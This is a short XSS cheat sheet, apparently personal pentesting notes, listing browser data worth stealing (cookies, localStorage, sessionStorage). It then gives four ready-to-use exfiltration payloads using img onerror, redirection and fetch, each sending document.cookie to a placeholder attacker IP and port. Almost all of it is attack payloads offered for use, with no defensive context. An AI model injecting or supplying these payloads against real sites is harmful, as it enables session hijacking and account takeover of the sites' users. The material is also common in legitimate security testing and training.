#xss

## Interesting Data
- `document.cookie` (will only work on cookies that have not the `HTTP-only` flag set).
- `JSON.stringify(localStorage)`
- `JSON.stringify(sessionStorage)`

## Examples of Ways to Exfiltrate Data
### Image
```js
<img src=x onerror=this.src='[ATTACKER_IP]:[ATTACKER_PORT]/?cookie='+document.cookie>
```

### Redirection

```js
<script>document.location.replace('http://[ATTACKER_IP]:[ATTACKER_PORT]/?cookie='+document.cookie)</script>
```

```js
<script>window.location('http://[ATTACKER_IP]:[ATTACKER_PORT]/?cookie='+document.cookie)</script>
```

### Fetch
```js
<script>fetch('[ATTACKER_IP]:[ATTACKER_PORT]?cookie=' + btoa(document.cookie) );</script>
```

